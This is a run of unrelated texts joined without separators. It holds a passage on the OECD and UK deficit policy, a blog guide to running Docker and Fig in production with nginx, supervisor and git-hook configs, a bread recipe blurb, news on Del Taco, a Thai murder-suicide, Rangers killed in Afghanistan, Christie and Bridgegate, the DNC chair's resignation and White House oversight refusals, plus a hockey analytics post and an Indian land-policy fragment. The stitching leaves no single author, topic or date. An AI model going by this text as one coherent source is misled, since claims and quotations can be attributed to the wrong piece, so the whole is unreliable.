Labour had seized on Mr Padoan's words and urged ministers to change course.
The OECD - the Organization for Economic Co-operation and Development - has previously been supportive of the government's approach to the deficit.
'Terrible results'
But in an interview with the Times newspaper, Mr Padoan said: "We see merit in slowing the pace of fiscal consolidation if there is not good news on the growth front.
"We have seen that growth numbers are a bit weaker than expected. Should that continue to be the case, there is scope for slowing the pace."
We have said that you should stay the course Angel Gurria, OECD secretary general
For Labour, shadow chancellor Ed Balls described the OECD's remarks as "a very significant intervention".
"Even the OECD, which has traditionally supported government economic policy and George Osborne's deficit reduction plan, is now saying the chancellor should consider changing course," he said.
Asked later whether Mr Padoan's words signalled a watering down of the OECD's support for the government, Mr Gurria said: "Oh no, I was there.
"He was being questioned about a hypothetical example about a very dramatic drop in the rate of growth, and whether one would then have to change course.
"He said that if there are some terrible results or whatever we'll have to take a look at it. But no way was there any signal of a change in course."
Asked again if the OECD backed the coalition's deficit reduction plans, Mr Gurria said: "Absolutely. We think it's the way to go. We have said that you should stay the course and continue to support this route."
'Misleading'
The Treasury said the OECD had never swayed in its support for the government's strategy.
Conservative MP Matthew Hancock said: "Ed Balls' credibility has today sunk to a new low. His typically misleading attempt to claim the OECD's support has spectacularly backfired.
"The OECD, the IMF and every major business organisation in the UK support the Government's plan."
Speaking on Wednesday, Prime Minister David Cameron said the government had been right to prioritise deficit-reduction since coming to office and cited the fact market interest rates had fallen in the UK - while rising elsewhere in the EU - as "proof" of international support for its deficit plans.
Docker is an amazing Linux containerization tool. At Burke Software, we moved our development environment to Fig months ago and are now using Docker in production as well. This guide should give you ideas. I'm going to cover a lot of technologies not related to Docker to give you an idea how we do things. In my examples I'm using burkesoftware.com which is on GitHub for learning purposes. You should be able to follow along and run the burkesoftware.com website in Docker! Talk about self promotion – did I mention we are available for hire?
Docker in development
In development we use Fig, a tool that makes Docker a bit easier to use. It's great whether you're a Linux admin, software engineer, or graphic designer with minimal command line experience. The Fig documentation is pretty good so I won't go into running it. With Fig everything gets standardized and mimics production. It would be a lot to ask for a designer to run solr, redis, postgres, and celery. Fig lets you do this. If your production environment runs a worker queue like celery, so should develop. The most differences between development and production, the more opportunities for bugs.
Current state of Docker in production
Docker itself is stable and past the 1.0 release. However the tools around it are not. For nontrivial deployments you need a little more than basic Docker commands or ‘fig up'. Flynn and Deis looks REALLY cool but are not stable yet. There is mesos and shipyard and lots more. Running Docker by hand can be a bit daunting. The guide will focus on the by hand approach – with some tools to support it.
Server
Let's start with a basic server. I'm using DigitalOcean. If you like this post and start a DigitalOcean account please consider using this affiliate link. The cool thing about Docker is you aren't tied to any one service as long as that service runs Linux. AWS? Microsoft? Your decade-old desktop lying around? Anything you want.
I use Ansible to provision my server. The idea here is it's somewhat self-documenting and I can throw out my DigitalOcean account and start it up on EC2 on a whim. Here is my Ansible YML file. This is my file and not intended to just copy. It's so that you to know how to use Ansible and get some ideas. I will refer to it often. Basically, any task I would normally do by hand I do via Ansible so it's reproducible. I'm using a private Git repo so I am actually adding secrets here.
Docker in Production
Docker itself is installed via Ansible. I'll follow the order that a incoming request to the server would take.
An incoming request hits nginx installed on the host. Nginx is using proxies to route to a port on localhost that a Docker instance is listening to. The following is my configuration for burkesoftware.com. Nginx has the task to route a request for burkesoftware.com to port 8002. Port 8002 was arbitrarily assigned by me. { server { listen 80; server_name burkesoftware.com; access_log /var/log/nginx/access.log; location / { proxy_pass http://127.0.0.1:8002; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } Supervisor – We need docker to be running and answer port 8002. We need an init system for Docker to run on and to respawn, restart, etc. Here is my supervisor conf file. WTF Fig in production??? [program:burkesoftware.com] command = fig -f /opt/fig/burkesoftware.com/fig.yml up stdout_logfile = /var/log/webapps/burkesoftware.com.log redirect_stderr = true Fig in production – This Docker blog post provides a basic overview of using Fig in production. While I prefer the Fig YML syntax over writing plain Docker commands, I still recommend taking some time to get familiar with Docker. You should know how to build, create, and remove Docker containers before going forward, because Fig won't help you if things blow up. Once you have an understanding of Docker, though, you'll find that Fig does make it very easy to connect and run various Docker containers. Here is my Fig production file: redis: image: dockerfile/redis web: build: /opt/burkesoftware.com command: gunicorn bsc_website.wsgi --log-file - -b 0.0.0.0:8000 -n burkesoftware.com volumes: - /opt/burkesoftware.com:/code ports: - "8002:8000" environment: - DATABASE_ADDR=NOPE - DATABASE_NAME=NOPE - DATABASE_USER=NOPE - DATABASE_PASSWORD=NOPE - USE_S3=Yup - AWS_ACCESS_KEY_ID=NOPE - AWS_SECRET_ACCESS_KEY=NOPE - AWS_STORAGE_BUCKET_NAME=NOPE mem_limit: 1000m links: - redis I'm saving the environment variables in the Fig file, which is in a private Git repo. I like tracking them in Git over something like Heroku where you just enter them without version control. Notice that port number again. I'm redirecting port 8002 to the container's port 8000 – which is just the port I always use in Fig. It could be anything but I want to change as little as possible from dev. The mem_limit will prevent the container from eating all system RAM. Look how easy it is to get redis up! I can just as easily run celery workers and other junk just like Fig in development. Persistent data – At this point our request has hit the Docker Gunicorn server which will respond. Cool. However, what happens when the container is restarted or even destroyed? Fig can deal with this itself and make databases persist; however, I don't trust it in production. I'd like to destroy the container fully and create a new one without losing my important data. You could use dockervolumes to mount the persistent data. I'm just going to run Postgres on my host. You could also use Amazon's RDS or an isolated database server. I feed in the Postgres credentials via environment variables as seen in the fig file. I'm storing my user uploaded files in S3. In my Ansible YML file you can see I'm backing up my entire Postgres database to S3 using the python package S3-backups. The important thing here is that I can stop and rm all my docker containers, rebuild them, and it's not a big deal. Updating production – I'm using Git hooks to update the server. I have staging servers here too. It's nice to give your developers easy access to push to staging and production with just Git. Notice I started a bare Git repo in the Ansible YML file. I'll use a post-receive hook to checkout the master branch, Fig build, collectstatic (Django specific), and migrate my database (also Django specific). Finally it will restart Docker using supervisor. The set -x will ensure whoever does the Git push will see everything in their terminal window. It's a lot like Heroku or, more accurately, Heroku is a lot like a Git hook because it is a Git hook. Unlike Heroku I can install packages and run anything I want. 🙂 #!/bin/bash NAME=burkesoftware.com set -x git --work-tree=/opt/$NAME/ checkout -f master fig -f /opt/fig/$NAME/fig.yml build fig -f /opt/fig/$NAME/fig.yml run --rm web ./manage.py collectstatic --noinput fig -f /opt/fig/$NAME/fig.yml run --rm web ./manage.py migrate supervisorctl restart $NAME
Hopefully all that gives you some idea of how we run Docker in production. Feel free to comment with questions!
I often comfort bake when it's cold and since embarking on this health eating journey I don't have so much appetite for sweet baked things as I used too. In fact I've got a long list of savoury recipes in a queue and hardly any sweet ones! I'm going to have to work on that a bit in the next few days. And so for today I present you one yummy Butternut Squash Rosemary Bread that is perfectly comforting savoury bake.
Baked with buckwheat, ground almonds and flaxseed it's a gluten-free bread and also vegan. The butternut squash binds it nicely together and makes a nice moist loaf. I've added some fresh rosemary, dried oregano and fresh garlic to the mix to create a nice fragrant bake. It's perfect for breakfast, afternoon snack and really great eaten with a nice big bowl of soup. Enjoy:)
Chicago restaurant tycoon Larry Levy has bought Lake Forest-based Del Taco in a deal valued at $500 million.
Levy is a well-regarded restaurateur who made his fortune in the food-service industry. In a conference call Thursday, Levy and Del Taco executives said they plan to expand the chain in “emerging and established” markets. They did not give specifics, and declined to take questions after the conference call.
Levy said Del Taco falls into the “center of our bullseye” with its 50-year history of serving inexpensive made-to-order foods.
“You can't beat Del Taco food, which is fresh and high quality,” Levy said. “We're are buying an iconic restaurant company at a very good price.”
Levy Acquisition Corp. is a family-run firm known on Wall Street as a “blank check company,” formed to pool funds to finance mergers. When the Del Taco sale closes in June, Levy Acquisition – a publicly-traded company – will change its name Del Taco Restaurants Inc. Del Taco will convert to a publicly traded company and trade under the NASDAQ ticker, LEVY.
Del Taco's headquarters will remain in Lake Forest. Paul Murphy will continue to run the chain as chief executive.
Murphy and other Del Taco executives said Del Taco has focused the last two years marketing the brand's fresh fast-food menu. Restaurants have also introduced premium burritos and bowls in an effort to attract diners who have fled to fresh-Mex chains like Chipotle Mexican Grill.
“We have always offered the food people crave at a great value, but in the last few years we changed the conversation,” Murphy said.
Levy is the co-founder of Levy Restaurants, which operates concession stands at arenas including Wrigley Field and U.S. Cellular Park, both in Chicago. Levy also owns popular Chicago restaurants including Spiaggia – one of President Barack Obama's favorite restaurants in the city.
As part of the merger, Levy's family and other investors will make a private investment of $120 million. Levy will become chairman of the board and will work with Del Taco management to oversee the company's growth.
Despite Levy's vast hospitality experience, restaurant strategist Dennis Lombardi pointed out he has never operated a food chain the size of Del Taco, which has 550 restaurants in 16 states.
“They certainly have limited service experience, but nothing like having a 500 plus West Coast QSR (quick service restaurant) chain,” said Lombardi, of WD Partners in Ohio. “If it is not completely new to them, in terms of service mode and cuisine, it is new to them in scale of operations.”
Talks of a Del Taco sale, which has had a series of different owners over the past decade, have been rumored for months.
Del Taco is the third largest Mexican fast-food chain in the nation, in terms of sales, according to Technomic, a restaurant consulting firm. Irvine-based Taco Bell and Chiptole rank No. 1 and 2, with highersales.
Murphy said company-owned stores have posted 10 consecutive quarters of positive same-store sales, driven in part by “balanced traffic and check growth.” Same-store sales are an indicator of a restaurant's financial health. Del Taco posted sales of $656.1 million in 2014, a 5.4 percent increase from 2013.
Levy grew a single Chicago delicatessen into an international food service company that generated over $1 billion in revenue. He sold Levy Restaurants in two stages, in 2000 and 2006.
Ed Hackbarth and David Jameson founded the first Del Taco in Yermo. The menu featured 19-cent tacos and 24-cent burgers. Roughly 300 of Del Taco's 550 locations are company owned. The rest are operated by franchisees.
In recent months, Del Taco has announced franchise deals for new stores in Chicago and New Jersey.

In a gated community in Chiang Mai province, a man and woman were found dead on Sunday afternoon in what police say is a case of murder-suicide.
At around 13:30, Hang Don district police station was notified about two people laying dead on the driveway of a house in Koolpunt Ville 7 in Nong Kwai area. When police arrived, they found the bodies Gianluca Maynardi Araldi, a 40-year-old Italian national, and his 35-year-old Thai wife Somjit Phanphon.
Thai media reports the incident occurred when the woman, who is believed to have been separated from her husband, went to collect their son who had been staying with his father during the weekend. After arriving at her husband's house, the woman was unable to find her son and confronted her husband.
An argument ensued and the woman went back to Toyota Camry car to collect a gun she is believed to have kept in the vehicle. She then returned to the house to threaten her husband.
The man managed to restrain his wife, taking the gun from her before opening fire and killing the woman instantly. Witnesses say the man then turned the gun on himself.
A pistol and spent bullets were found nearby. Police told reporters the 8-year-old son had been staying with a neighbour when the incident occurred.
“We are investigating the circumstances of the combat deaths of the two Army Rangers in the beginning of what was an intense three-hour firefight,” the Pentagon spokesman, Capt. Jeff Davis, told reporters on Friday. He said it was “possible” that the two Rangers were struck by friendly fire.
The soldiers were killed in an action fighting the Islamic State in Nangarhar Province. They were taking part in a lengthy raid, supported by airstrikes from American warplanes, in Achin, a small district where a number of Islamic State fighters have been engaging in a long-running battle with Afghanistan security forces.
Achin is the same district where the Pentagon deployed the United States military's most powerful conventional bomb two weeks ago. That weapon, nicknamed the “mother of all bombs,” targeted Islamic State fighters who were hiding in caves and a tunnel complex.
The Defense Department deemed the operation successful. But since then, fighting in the area has continued and the Afghanistan military, supported by the Defense Department, has yet to clear the area of remaining Islamic State fighters.
Captain Davis said the target of Wednesday's deadly raid was Abdul Hasib, whom Defense Department officials called the emir of the Islamic State in Afghanistan. Pentagon officials said they could not confirm that he was killed in the operation.
Some 50 Army Rangers joined 40 Afghan commandos in the raid. Defense Department officials said 35 Islamic State fighters were believed to have been killed.
As the dust begins to settle around the guilty plea and nine-count indictments of three former members of Gov. Chris Christie's inner circle in connection with the closing of access lanes at the George Washington Bridge in 2013, one Republican state senator — speaking out of tune with many of his colleagues — has some harsh words for the presidential hopeful.
“The seeds for this entire event were planted when Chris Christie made the decision that he was going to run for reelection and basically ignore the Republican candidates that were running, including those running for the legislature,” said state Senator Mike Doherty (R-23), a ranking GOP member of the legislature. “His obsession with getting these 100 Democratic mayors led to this entire Bridgegate scandal.
“He's got no one to blame but himself for this fiasco,” he added.
That fiasco — colloquially known as Bridgegate — was vaulted back into national headlines last week when U.S. Attorney Paul Fishman announced last week that criminal charges were being brought against three key players involved in the closings: former Port Authority official David Wildstein, former Port Authorty deputy executive directior Bill Baroni, and former Christie deputy chief of staff Bridget Kelly. Wildstein pled guilty to a two count information in federal court on Friday, admitting that he had conspired to shut down the lanes in Fort Lee as political retribution for the town's Democratic mayor, who had refused to endorse the governor during his 2013 reelection campaign. Kelly and Baroni, meanwhile, proclaimed innocence during their own court appearance yesterday, calling Wildstein a “liar.”
The news has also vaulted Christie — a likely candidate for the 2016 Republican nomination whose ambitions have been stymied by the scandal over these last two years– back into the spotlight. Pundits and political commentators spent the weekend speculating over all the ways the scandal might affect the Republican's future political prospects, and the verdict, at this point, seems mixed: some observers, including many Republicans, have declared him exonerated of wrongdoing given an outcome that agrees with his previous claims about the situation, while others, mainly Democrats, consider it impossible to deny that Christie was at least partly responsible for creating a culture where subordinates thought a political payback scheme was acceptable.
Christie, for his part, has defended himself with the former narrative, and prosecutors last week were careful not to fuel questions over the incumbent's involvement in the lane closings.
But Doherty, a 14 year veteran of the state legislature who's vocally criticized the governor on other issues, said Christie's fault in the matter is more political in nature. He points to the governor's apparent reelection strategy in 2013, which placed a huge emphasis on bringing Democratic officials into the fold in an effort to secure a historically wide margin in his victory over former state Senator Barbara Buono and appear more bipartisan in the process. That strategy was largely successful, with Christie taking the election with some 61 percent of the vote and garnering support from demographics traditionally untapped by Republicans, including blacks and Latinos; but according to Doherty, it also forced Christie to abandon those who helped make his career possible in the first place.
“I think I represent a lot of people who think he used us to get into the office, and then when it came time to use up some of that political capital that we helped him garner, he decided he was not going to expend any political capital on any of the Republican candidates, he was just going to use it for his own ambition,” Doherty said.
“It's going to be a continuing dark cloud over the state of New Jersey, it's going to diminish the reputation of the Republican party, and good luck to somebody running in 2017.”
To underscore the point, Doherty detailed to PolitickerNJ “one of the most strange political campaign events in my life,” which was a campaign stop Christie made in 2013 to Warren County, within Doherty's home district. It was the weekend before the election, and Christie's last visit to the county, and Doherty said the local Republican slate had gathered at Hot Dog Johnny's, an “iconic hot dog joint” off of Route 46, he said, to greet Christie upon his arrival. Freeholder and legislative candidates mulled about the establishment with their families and supporters, excited to have the governor come and rally the team. But what they got when Christie's motorcade finally showed up was not what they were expecting, he said.
“It was just an extremely weird event, which I think is emblematic of the whole campaign,” Doherty said. “There were no speeches, none of the candidates running were allowed to speak, there was no platform or microphone, no nothing. And we just stood around, freeholder candidates, sheriff, legislative candidates, Republicans, and basically stood around with our thumb up our asses and waited for the bus to show up, and the governor got out, and he was surrounded by what I felt was an extremely large number of states troopers.”
Doherty said the event was notable because it shed light on Christie's strategy that year: “He didn't want to be seen with Republicans or campaign with Republicans.
“There was none of that. It was absolutely the contrary,” he said. “They made a purposeful decision not to have any speeches, not to have any platform, not to have any focus, not to recognize any of the elected officials there that were on the ballot with the governor. It was like an ego trip, as opposed to actually trying to help Republicans get elected. It was almost as if it was an obligation but he really didn't want to be seen with us.”
A West Point graduate who once served as a nuclear operation office in Germany with the U.S. military, Doherty said his grievances with the governor's 2013 run in part comes down to his hallmark leadership style. Christie's campaigning that year was, in fact, marked by a calculated design meant to win over local Democratic mayors and officials, such as Essex County executive Joe Divencenzo, and play for GOP seats in a select number of battleground districts, such as LD14, LD18, and LD38. For Christie, it paid off: political experts look on the Republican's reelection campaign as a major turning point in the pragmatic pol's effort to establish himself as a bipartisan power broker willing to reach across the aisle and make difficult decisions, and his overwhelming victory helped him achieve national recognition within his own party.
But the governor arguably also managed to offend Republicans in the process, especially in a handful of South Jersey districts where rumors spread of the Republican cutting backroom deals with Democratic leaders like George Norcross III to avoid campaigning on their home turf in exchange for political support. In the end, Doherty insisted that his single-minded pursuit of reelection victory — and the Democratic support that helped make it so definitive — ultimately hurt Republicans in New Jersey.
“One of the fundamentals of leadership is caring about your team, is not leaving anybody behind. The team goes across the goal line together, and a leader feels bad, ashamed, embarrassed when he leaves people behind. And here there was not even an effort to bring the team across the finish line. There was merely an effort for promoting himself. And we lost a tremendous opportunity,” Doherty said.
Instead, Doherty said he would've like to see Christie settle for a smaller margin of success — 55 percent, perhaps — in order to campaign harder for those Republicans who helped get him elected in 2009. He noted that the party failed to add any seats to the legislature during Christie's second run, despite a well-liked Republican executive finally occupying the front office.
“Why garner political capital unless you're going to expend it? You garner political capital so that by the fall election, you can tell the voters hey by the way, when you're voting for me for reelection, vote for the Republicans too because I need them to do this and that and the other thing,” Doherty said, adding Christie “throws out compliments for Republican elected officials like manhole covers.”
Doherty argued there are other governors — and presidential candidates — out there who have been successful in both garnering the popular vote but also building their own parties in the process, including Wisconsin Gov. Scott Walker. Doherty said for him, “that's more of leader, because you're able to get a majority and actually effectuate policy changes in the state of New Jersey.”
“It's a serious character flaw that you do not care about your people,” he said.
Doherty's comments, aside from being a staunch condemnation of Christie's 2013 campaign tactics, also underscore what many see as a slow splintering of allegiance among Republicans in Trenton. Christie swears his relationship with his GOP allies in the legislature has not weakened or wavered, but in a party that has shown in past years an almost dogged loyalty to the governor, there is evidence of growing fatigue. Earlier this month, state Senator Joe Kyrillos (R-13), a longtime friend and close Christie ally, defected to the campaign of one of the Republican's biggest opponents, former Florida Senator Jeb Bush. Kyrillos' departure has been viewed as an overwhelming blow to Christie's burgeoning presidential campaign, even if the governor himself dismisses it.
And the bleeding may not stop there: according a recent report in Politico, Bush is moving forward with a plan to have a majority of the state's 16 Republican state senators endorse him, though no others have announced their support publicly.
Doherty suggested Kryillos' defection — which he thinks “says a lot”, given his long-standing relationship to Christie — could encourage others to move away from the governor in the coming weeks. But he noted that much of the GOP leadership in Trenton still stands with Christie when it comes to major legislative efforts, including a vote recently on a package of bills aimed at overhauling the Port Authority. That legislation had passed both houses unanimously last year, then was vetoed by the governor; but when it came back for an override vote in March, almost all Republicans — save Doherty himself — flipped and stood firmly alongside Christie.
One of the factors that convinced several Republicans to vote down the override despite supporting the original legislation was the introduction of a separate reform package by Senate Minority Leader Tom Kean (R-21) a few months prior. Doherty said he is sometimes confused by Kean's support for Christie's initiatives, given Christie's attempt in 2013 to oust Kean from his leadership post.
Kean's upset win over Christie-backed state Senator Kevin O'Toole (R-40) that year — which, for many, was the first time Republicans had defied the governor — was seen as a consequence of Christie's restrained campaign-time presence in South Jersey, where Kean sought thanklessly to flip seats with a handful of female candidates despite the governor's own plan to avoid doing so.
“Sometimes I scratch my head, because Tom really owes no allegiance to Chris Christie and yet he seems to carry water for him from time to time,” Doherty said.
Ultimately, Doherty said the party's problems in New Jersey are likely to continue, particularly given the events of the past week. Whether or not Christie himself is able to get beyond the fallout from Bridgegate and continue on with a presidential run, Doherty argued the scandal ultimately reflects “negatively on all Republicans and our message.”
“It's going to be a continuing dark cloud over the state of New Jersey, it's going to diminish the reputation of the Republican Party, and good luck to somebody running in 2017,” Doherty said. “It seems a longer and longer shot that a Republican is going to get consideration by the voters of New Jersey. They're going to say, are you kidding me, we just had eight years of Republican rule and what do we have to show for it?”
The governor's office declined to comment on the senator's criticisms, but noted a certain irony in the fact that Doherty would point to Christie's appearance in Warren, one of the most conservative counties in the state, as evidence that he had avoided campaigning with Republicans.
“We have a lot of problems, and we've been pulled into this storm that appears it's going to last another couple of years,” Doherty added. “I'm sick and tired of it, frankly.”
Is it possible for a hockey player to be recognized as a good, useful player without having corresponding good possession numbers? Possibly the anti-Tyler Kennedy (a largely ineffective NHL player with usually solid possession stats)? It is an interesting debate for the so-called "advanced stats community" which tends to value shot based possession stats in order to determine player value.
New Pittsburgh Penguins winger Nick Spaling could be a perfect case study.
Ryan Wilson, the awesome blogger, had this recommended article entitled "Concerns on Nick Spaling". In the piece, as you can tell, Spaling's weak Corsi relative was highlighted, with the go-home line of:
Spaling's numbers aren't great and I do not believe that paying him in that 1.8-2.0M range is good value when you compare it with some of the other contracts that have been awarded so far this free agency period. Rutherford has done a very nice job with his bottom 6 value signings so far this offseason. Nick Spaling probably won't be one of those contracts.
Given the evidence presented about low Corsi, a high shooting percentage (albeit, his second year in a row of a high %) and less PP time next season, it's a perfectly reasonable finish-line to reach.
For more context and a different view of Spaling, by those who have seen him play a lot more real-time hockey, let's compare that assessment to the Predators blog, On The Forecheck, with a portion of their season review.
Spaling had the highest total of goals (13), assists (19) and points (32) for his career, coupled with his lowest PIM total (14) over the last four years. He ended the year with five points in the last five games including a two point night against the Chicago Blackhawks. Spaling is the definition of an NHL USB drive. You can plug him in anywhere and get results. Hustle and defensive play earned him a ton of PK time and his work in front of the net paid off on the PP after Hornqvist was used on the first unit. Under the influence of Paul Gaustad, Spaling's FO% improved from 46.3% in 2012-13 to 52.7%
You can (and should) read the whole thing for yourself, but the article and 123 comments are basically giddy about the way Spaling played last season. Harder to quantify skills like "hustling" and a swiss army like versatility is highlighted on what made Spaling a valuable player on Nashville last year, as evidenced by the poll in that article where 86% of Predator fans who responded graded Spaling with an "A" or a B" for his performance.
Define value by purely a CF% or Corsi Rel, and it doesn't make much sense to pay Nick Spaling in the $2 million range (give or take) when there are other options like Lee Stempniak, David Booth and Devin Setoguchi for a cheaper salary who are likely to provide about the same level of total production, even if there are reasons why the fit would not be great in Pittsburgh- like Stempniak's weak 3 point in 13 game playoffs or Booth being a "weird dude" to perhaps give credence in looking past spreadsheets and Corsi when it comes to roster construction.
If one takes a broader look and gives weight to Spaling being more versatile, younger and unlike the guys in the bargain bin, he is coming off a career season and the arrow is pointing up on him, and perhaps you wouldn't be so quick to think "bad Corsi Rel, bad player, soon-to-be bad contract".
Where my interest lies is in determining what makes a hockey player worth the value. Is it simply who has a blue bubble on Extraskater? Is it CorsiRel or bust? Should add context for versatility to play in multiple roles/positions and the intangibles have much if any weight? Where do those hard to quantify value-adds like "hustle" and "defensive play" (the kind apparently not quantified in Corsi) factor into the equation?
Spaling will be an interesting case study because he seems like a decent enough (but not spectacular) NHL level player, capable of contributing but not a consistent scorer that isn't going to have great underlying stats. In many ways, Penguins fans are going to project what they want to see in him. It will be interesting to see how the advanced stats community factors in the contributions Spaling makes over the course of the season, and how the more ley mind takes into account misgivings that he might have as well.
Debbie Wasserman Schultz announced Sunday she will soon step down as Democratic National Committee chairwoman, amid the fallout over leaked emails indicating an anti-Bernie Sanders bias in her operation -- a stunning development just hours before the start of her party's convention.
In a written statement, the controversial party leader said she was "privileged to serve as the DNC Chair for five and a half years."
She said her first priority is serving the people of her Florida congressional district while stressing the importance of helping elect Hillary Clinton, adding: "Going forward, the best way for me to accomplish those goals is to step down as Party Chair at the end of this convention."
She said she would still "open and close the convention," which begins Monday in Philadelphia, and address delegates "about the stakes involved in this election," in her role as party chair.
She apparently will step down at the end of the convention. Vice Chairwoman Donna Brazile is slated to take over as interim chair during the rest of the general election campaign.
The announcement came just hours after reports first surfaced that Wasserman Schultz may be denied a speaking role at the convention, and that she would not be presiding -- a decision apparently made under pressure from the Clinton campaign and the White House.
Rep. Marcia Fudge, D-Ohio, the former chairwoman of the Congressional Black Caucus, will instead preside over the Democratic proceedings as convention chairwoman. On the sidelines, party officials were already discussing Wasserman Schultz' role as DNC chairwoman.
One Democratic source told Fox News, “Debbie is being forced out sooner than later.”
The rapid-fire set of developments ahead of the convention kick-off raise immediate questions about whether the party can unite its battling factions in Philadelphia this week.
Officials were clearly trying to prevent anger over the email leak controversy and other issues from disrupting proceedings. The emails only bolstered claims from Sanders – and Republican nominee Donald Trump – that the system was rigged against the Vermont senator.
Trump tweeted after the DNC news broke:
Today proves what I have always known, that @Reince Priebus is the tough one and the smart one, not Debbie Wasserman Shultz (@DWStweets.) — Donald J. Trump (@realDonaldTrump) July 24, 2016
Sanders himself blasted the DNC and Wasserman Schultz in interviews earlier Sunday, demanding her resignation as party chairwoman.
“I think [Wasserman Schultz] should resign. Period. And I think we need a new chair who is going the lead us in a very different direction,” Sanders told ABC's “This Week” on Sunday, hours before the resignation was announced.
He later issued a statement thanking her for her service, and saying she made "the right decision for the future of the Democratic Party."
President Obama and Clinton both issued statements thanking Wasserman Schultz for her service.
"I am grateful to Debbie for getting the Democratic Party to this year's historic convention in Philadelphia, and I know that this week's events will be a success thanks to her hard work and leadership," Clinton said, adding that she will serve as "honorary chair of my campaign's 50-state program to gain ground and elect Democrats in every part of the country" and act as a surrogate.
The WikiLeaks document dump, which included emails from January 2015 to May 2016, purportedly came from the accounts of seven DNC officials. In a May 5 email, a DNC employee asked a colleague to collect information on his religious beliefs – claiming it might sway voters in West Virginia and Kentucky. In that particular email, Sanders' name was not mentioned, but he was the only other candidate in the race at that time against Clinton.
DNC chief financial officer Brad Marshall wrote, “This would make several points difference with my peeps. My Southern Baptist peeps would draw a big difference between a Jew and an atheist.”
Others from Wasserman Schultz herself contained very strong language, raising questions about her status as an ostensibly neutral party official.
Responding to Sanders' complaints the party hasn't been fair to him, she wrote to a staffer in an April email: “Spoken like someone who has never been a member of the Democratic Party and has no understanding of what we do.”
Responding to the same staffer a month later regarding Sanders campaign manager Jeff Weaver blaming the Nevada state party for a raucous convention, she wrote, “Damn liar. Particularly scummy that he barely acknowledges the violent and threatening behavior that occurred.”
The White House is telling federal agencies to blow off Democratic lawmakers' oversight requests, as Republicans fear the information could be weaponized against President Donald Trump.
At meetings with top officials for various government departments this spring, Uttam Dhillon, a White House lawyer, told agencies not to cooperate with such requests from Democrats, according to Republican sources inside and outside the administration.

It appears to be a formalization of a practice that had already taken hold, as Democrats have complained that their oversight letters requesting information from agencies have gone unanswered since January, and the Trump administration has not yet explained the rationale.
The declaration amounts to a new level of partisanship in Washington, where the president and his administration already feels besieged by media reports and attacks from Democrats. The idea, Republicans said, is to choke off the Democratic congressional minorities from gaining new information that could be used to attack the president.
"You have Republicans leading the House, the Senate and the White House," a White House official said. "I don't think you'd have the Democrats responding to every minority member request if they were in the same position."
A White House spokeswoman said the policy of the administration is “to accommodate the requests of chairmen, regardless of their political party.” There are no Democratic chairmen, as Congress is controlled by Republicans.
The administration also responds to “all non-oversight inquiries, including the Senate's inquiries for purposes of providing advice and consent on nominees, without regard to the political party of the requester,” the spokeswoman said. “ Multiple agencies have, in fact, responded to minority member requests. No agencies have been directed not to respond to minority requests.”

Republicans said that President Barack Obama's administration was not always quick to respond to them and sometimes ignored them. However, the Obama White House never ordered agencies to stop cooperating with Republican oversight requests altogether, making the marching orders from Trump's aides that much more unusual.
“What I do not remember is a blanket request from the Obama administration not to respond to Republicans,” said a former longtime senior Republican staffer.
There are some exceptions to the Trump administration order, particularly from national security agencies, Democrats and Republicans said. Agencies will also comply if a Republican committee chairman joins the Democratic requests, but ranking members' oversight requests are spurned.
Congressional minorities frequently asked questions of the administration intended to embarrass the president or garner a quick headline. And Democrats have fired off requests they surely knew the administration would not answer, such as asking the White House in March to make visitor logs of Trump Tower and Mar-a-Lago publicly available.
But House and Senate lawmakers also routinely fire off much more obscure requests not intended to generate news coverage. And the Trump administration's plans to stonewall Democrats is in many ways unprecedented and could lead to a worsening of the gridlock in Washington.
Austin Evers, a former Obama administration lawyer in the State Department who runs a watchdog group called American Oversight, said the Trump administration has instituted a “dramatic change” in policy from Reagan-era congressional standards in which the government provided more information to committee chairman but also consistently engaged in oversight with rank-and-file minority members.
“Instructing agencies not to communicate with members of the minority party will poison the well. It will damage relationships between career staffers at agencies and subject-matter experts in Congress,” Evers said. “One of the reasons you respond to letters from the minority party is to explain yourself. It is to put on the record that even accusations that you find unreasonable are not accurate.”
One month ago, Rep. Kathleen Rice (D-N.Y.) and other Democrats sent a letter to the Office of Personnel Management asking for cybersecurity information after it was revealed that millions of people had their identities compromised. The letterasked questions about how cybersecurity officials were hired, and in Rice's view, it “was not a political letter at all.”
"The answer we got back is, ‘We only speak to the chair people of committees.' We said, ‘That's absurd, what are you talking about?'” Rice said in an interview. “I was dumbfounded at their response. I had never gotten anything like that … The administration has installed loyalists at every agency to keep tabs on what information people can get.”
At a House Appropriations hearing in May, Rep. Matt Cartwright (D-Pa.) asked acting General Services Administrator Tim Horne about a briefing House Oversight Committee staffers had received from the GSA, in which they were informed that the “GSA has a new policy only to respond to Republican committee chairmen.”
“The administration has instituted a new policy that matters of oversight need to be requested by the committee chair,” Horne responded.
In February, Sen. Patty Murray (D-Wash.), and Sen. Ron Wyden (D-Ore.) asked for information on changes to healthcare.gov from the Health and Human Services Department. They're still waiting for an answer. In early May, Murray and six other senators asked the president about why Vivek Murthy was dismissed as surgeon general. There was no response, and her staff said those are just a couple of the requests that have gone unanswered.
“It's no surprise that they would try to prevent Congress from getting the information we need to make sure government is working for the people we represent,” Murray said when asked about the lack of cooperation.
The Senate's Homeland Security and Government Accountability Committee, the primary investigator in that chamber, has received some responses from the Trump administration but has seen several letters only signed by Democrats ignored. Sen. Claire McCaskill (D-Mo.) wrote Education Secretary Betsy DeVos asking for help addressing the challenges of rural schools and joined with Sen. Tom Carper (D-Del.) to question the security of Trump's use of a personal cell phone as president. Neither was answered, an aide said.
A senior Democratic aide said that of the Senate Democrats' 225 oversight letters sent to the Trump administration since January asking for information, the vast majority have received no response.
“When it comes to almost anything we've done at a federal agency, very close to 100 percent of those we haven't heard anything back. And at the White House it's definitely 100 percent,” said a second senior Democratic aide. “This is rampant all over committee land.”
Problems of industrial and infrastructure development, as also the problems relating to food security would have been easily resolved by following the Japanese model, and allowing Indian farmers a price for their produce that is attractive. The ideal solution lies in allowing farmers to continue unhindered in agricultural cultivation, if they so wish, but also permitting them the full liberty to dispose of their land  like the freedom that was given to the textile mill owners of Mumbai after the mills went bankrupt, permitting them to dispose of their land to any person, at any time, and at a price that suited them. Jairam Ramesh's magnanimity in stipulating that multi-cropped irrigated lands will not be acquired under any circumstances like saying that invading marauders should not take away your prettier daughters, only the less attractive ones.
